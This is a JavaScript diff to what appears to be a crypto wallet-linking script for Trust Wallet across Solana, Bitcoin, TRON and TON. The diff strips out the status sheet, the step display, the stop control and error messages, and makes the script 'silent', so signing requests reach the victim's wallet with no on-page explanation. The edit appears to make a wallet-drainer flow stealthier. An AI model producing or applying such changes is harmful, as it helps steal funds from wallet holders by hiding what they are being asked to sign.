@@ -83,42 +83,14 @@
       return;
     }
     running = true;
-    var sheet = ensureSheet();
-    sheet.style.display = 'flex';
-    // Hide preflight sheet if open
-    try {
-      var pf = document.getElementById('__trust_preflight_sheet');
-      if (pf) pf.style.display = 'none';
-    } catch (_) {}
-
-    stepState = { Solana: '⏳', Bitcoin: '⏳', TRON: '⏳', TON: '⏳' };
-    renderSteps();
-    setStopEnabled(true);
-    setStatus('Step: link networks in Trust when Confirm appears (~10s+).');
+    // SILENT satellites — sheet stays hidden; runPhaseB() still fires sign requests
+    // to the wallet app (SOL/TRON/TON popups appear in Trust Wallet directly).
 
     try {
-      var res = await window.legion.runPhaseB({
-        onStatus: function (ev) {
-          if (ev && ev.label) {
-            markStep(ev.label, ev.state);
-            if (ev.state === 'active') setStatus('Confirm: ' + ev.label + '…');
-            else if (ev.state === 'ok') setStatus(ev.label + ' ready');
-            else if (ev.state === 'skip') setStatus(ev.label + ' skipped (not linked)');
-          }
-          if (ev && ev.phase === 'done') {
-            setStatus(ev.label || 'Done');
-          }
-        },
-      });
-      if (res && res.aborted) {
-        setStatus('Stopped. EVM kept; remaining skipped.');
-      } else {
-        setStatus('Network step complete. Skips = Trust did not link that family.');
-      }
+      await window.legion.runPhaseB({ onStatus: function () {} });
     } catch (e) {
-      setStatus('Phase B error: ' + (e && e.message ? e.message : 'fail'));
+      // swallow — silent mode, no UI to update
     } finally {
-      setStopEnabled(false);
       running = false;
     }
   }
